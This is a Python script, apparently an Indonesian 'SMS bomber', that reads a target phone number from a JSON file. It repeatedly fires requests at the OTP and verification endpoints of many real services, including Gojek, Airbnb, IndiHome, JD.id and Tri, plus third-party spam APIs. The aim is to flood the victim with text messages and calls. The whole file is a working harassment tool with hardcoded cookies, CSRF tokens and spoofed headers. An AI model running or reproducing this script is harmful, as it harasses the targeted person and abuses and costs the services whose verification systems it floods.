# -*- coding: utf-8 -*-
import requests, sys
sys.path.insert (0, "..")
from warna import *
s = Session()


jl = json.load (open ("nomor.json"))
nomor = jl["nomor"]
jumlah = int(jl["jumlah"])
jeda = jl["jeda"]
nomor1 = nomor[1:]
nomor2 = "62"+ nomor1
nomor3 = "+"+ nomor2


def ulang():
	sys.stdout.flush ()
	system ("sleep "+ jeda)


def emails():
	mail = ""
	for x in range (12):
		mail += random.choice ("abcdefghijklmnopqrstuvwxyz1234567890")
	return mail + random.choice (["@gmail.com", "@yahoo.com", "@hotmail.com"])


def Call_JAG():
	try:
		for i in range (jumlah):
			rp = post ("https://id.jagreward.com/member/verify-mobile/"+ nomor1, data = {"method": "CALL", "countryCode": "id"}, headers = {"Accept-Encoding": "gzip, deflate, br", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "Content-Type": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b1584709816", "DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0", "_ga": "GA1.2.2037151396.1584709855", "Origin": "https://id.jagreward.com", "PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc", "Referer": "https://id.jagreward.com/member/register/", "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36", "X-Requested-With": "XMLHttpRequest"}).text
			if "Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini." in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (h +"\rCall"+ uj +" JAG"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Call_JAG()


def Sms_4444():
	try:
		for i in range (jumlah):
			rp = post ("https://registrasi.tri.co.id/daftar/generateOTP", data = {"msisdn": nomor}, headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "Cookie": "PHPSESSID=5noisam2cugiq25l6374u79975", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.62 Safari/537.36"}).text
			if "success" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ u4 +" 4444"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_4444()


def Sms_97080():
	try:
		for i in range (jumlah):
			rp = post ("https://nabil.my.id/api/codashopspamtsel", data = {"nomor": nomor, "jumlah": jumlah, "delay": "1000"}, headers = {"accept": "*/*", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "content-length": "27", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://nabil.my.id", "referer": "https://nabil.my.id/Codashop_Spam_Telkomsel", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36", "x-requested-with": "XMLHttpRequest"}).text
			if "sukses" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ u9 +" 97080"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_97080()


def Sms_ALTBLJ():
	try:
		for i in range (jumlah):
			jml = {"country_code": "62", "phone_number": nomor1}
			rp = post ("https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID", data = json.dumps(jml), headers = {"Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6", "Connection": "keep-alive", "Content-Length": "{len(str(jml))}", "Content-Type": "application/json;charset=UTF-8", "Origin": "https://lite.altbalaji.com", "Referer": "https://lite.altbalaji.com/subscribe?progress=input", "Save-Data": "on", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36"}).text
			if "ok" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ ua +" ALTBLT"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_ALTBLJ()


def Sms_AUTHMSG():
	try:
		for i in range (jumlah):
			jml = {"phoneNumber": nomor2, "workFlow": "GLOBAL_SIGNUP_LOGIN", "otpMethod": "TEXT"}
			rp = post ("https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id", data = json.dumps(jml), headers = {"accept": "application/json, text/javascript, */*; q=0.01", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "cache-control": "no-cache", "content-type": "application/json", "origin": "https://www.airbnb.co.id", "referer": "*https://www.airbnb.co.id/signup_login", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36", "x-csrf-token": "V4$.airbnb.co.id$pgPRrSWF_-4$VvFL20hLPGSifNfUZuQFk0hBSM2sFv7ptbLjEn1qEp0=", "x-csrf-without-token": "1", "x-requested-with": "XMLHttpRequest"}).text
			if "success" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ ua +" AUTHMSG"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_AUTHMSG()


def Sms_AYO_SRC():
	try:
		for i in range (jumlah):
			rp = post ("https://nabil.my.id/api/ayosrcspam", data = {"nomor": nomor2, "jumlah": jumlah, "delay": "1000"}, headers = {"accept": "*/*", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "content-length": "27", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://nabil.my.id", "referer": "https://nabil.my.id/Ayo_Src_Bom", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36", "x-requested-with": "XMLHttpRequest"}).text
			if "Terkirim" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ ua +" AYO SRC"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_AYO_SRC()


def Sms_GO_JEK():
	try:
		for i in range (jumlah):
			rp = post ("https://api.gojekapi.com/v5/customers", data = {"email": emails(), "name": "irul", "phone": nomor, "signed_up_country": "ID"}, headers = {"Accept": "application/json", "Accept-Encoding": "gzip", "Accept-Language": "id-ID", "Authorization": "Bearer", "Connection": "Keep-Alive", "Host": "api.gojekapi.com", "User-Agent": "okhttp/3.12.1", "X-AppId": "com.gojek.app", "X-AppVersion": "3.52.2", "X-Platform": "Android", "X-Session-ID": "f8b67b26-c6a4-44d2-9d86-8d93a80901c9", "X-UniqueId": "8606f4e3b85968fd", "X-User-Locale": "id_ID", "X-User-Type": "customer"}).text
			if "Masukkan kode yang kami SMS ke nomor HP-mu yang terdaftar" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ ug +" GO-JEK"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_GO_JEK()


def Sms_IndiHome():
	try:
		for i in range (jumlah):
			rp = post ("https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp", data = {"type": "hp", "msisdn": nomor}, headers = {"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://sobat.indihome.co.id", "referer": "https://sobat.indihome.co.id/register", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36", "x-requested-with": "XMLHttpRequest"}).text
			if "Kode verifikasi telah dikirim ke hp Anda" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ ui +" IndiHome"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_IndiHome()


def Sms_JOY_JD_id():
	try:
		for i in range (jumlah):
			rp = post ("https://passport.jd.id/sms/sendSMSCode", data = {"phone": nomor}, headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Cookie": "__jda=161319996.15195775008192065165156.1519577501.1519892386.1523711222.3", "Connection": "keep-alive", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "Host": "passport.jd.id", "Referer": "https://passport.jd.id/register/phone", "X-Requested-With": "XMLHttpRequest"}).text
			if "true" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ uj +" JOY-JD.id"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_JOY_JD_id()


def Sms_KelasPintar():
	try:
		for i in range (jumlah):
			rp = post ("https://www.kelaspintar.id/user/otpverification", data = {"user_mobile": nomor1, "otp_type": "send_otp_reg", "mobile_code": "+62"}, headers = {"accept": "application/json, text/javascript, */*; q=0.01", "accept-encoding": "gzip, deflate, br", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "content-length": "62", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.kelaspintar.id", "referer": "https://www.kelaspintar.id/", "save-data": "on", "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36", "x-requested-with": "XMLHttpRequest"}).text
			if "New OTP send successfully" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ uk +" KelasPintar"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_KelasPintar()


def Sms_KITABISA():
	try:
		for i in range (jumlah):
			rp = post ("https://core.ktbs.io/v2/user/registration/temp", json = {"full_name": "IRUL", "user_id": nomor, "user_id_type": "phone_number"}, headers = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36"}).text
			if "status" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ uk +" KITABISA"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_KITABISA()


def Sms_MAPCLUB():
	try:
		for i in range (jumlah):
			jml = {"phone": nomor}
			rp = post ("https://cmsapi.mapclub.com/api/signup-otp", data = json.dumps(jml), headers = {"Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6,da;q=0.5,pt;q=0.4,jv;q=0.3", "Connection": "keep-alive", "Content-Length": "23", "content-type": "application/json", "Host": "cmsapi.mapclub.com", "Origin": "https://www.mapclub.com", "Referer": "https://www.mapclub.com/id/user/signup", "Save-Data": "on", "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36"}).text
			if "ok" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ um +" MAPCLUB"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_MAPCLUB()


def Sms_PHD_Order():
	try:
		for i in range (jumlah):
			rp = post ("https://www.phd.co.id/en/users/sendOTP", data = {"phone_number": nomor}, headers = {"Referer": "https://www.phd.co.id/en/users/createnewuser", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"}).text
			if "OK" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ up +" PHD Order"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_PHD_Order()


def Sms_PROSEHAT():
	try:
		for i in range (jumlah):
			rp = post ("https://www.prosehat.com/wp-admin/admin-ajax.php", data = {"phone_or_email": nomor, "action": "ajaxverificationsend"}, headers = {"accept": "application/json, text/javascript, */*; q=0.01", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.prosehat.com", "referer": "https://www.prosehat.com/akun", "user-agent": "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36", "x-requested-with": "XMLHttpRequest"}).text
			if "token" in rp:
				berhasil.append (i)
			else:
				gagal.append (i)
			sys.stdout.write (k +"\rSms"+ up +" PROSEHAT"+ n +" • "+ h + str(len(berhasil)) + u +" : "+ m + str(len(gagal)) +"   ")
			ulang()
		hapus()
	except ConnectionError:
		koneksi()
		Sms_PROSEHAT()


def irul():
	system ("xdg-open https://core.ktbs.io/v2/user/registration/otp/"+ nomor)
	Call_JAG()
	Sms_4444()
	Sms_97080()
	Sms_ALTBLJ()
	Sms_AUTHMSG()
	Sms_AYO_SRC()
	Sms_GO_JEK()
	Sms_IndiHome()
	Sms_JOY_JD_id()
	Sms_KelasPintar()
	Sms_KITABISA()
	Sms_MAPCLUB()
	Sms_PHD_Order()
	Sms_PROSEHAT()
	system ("php kode_otp.php")
	system ("python2 Sms_4444 "+ nomor)
	enter()


irul()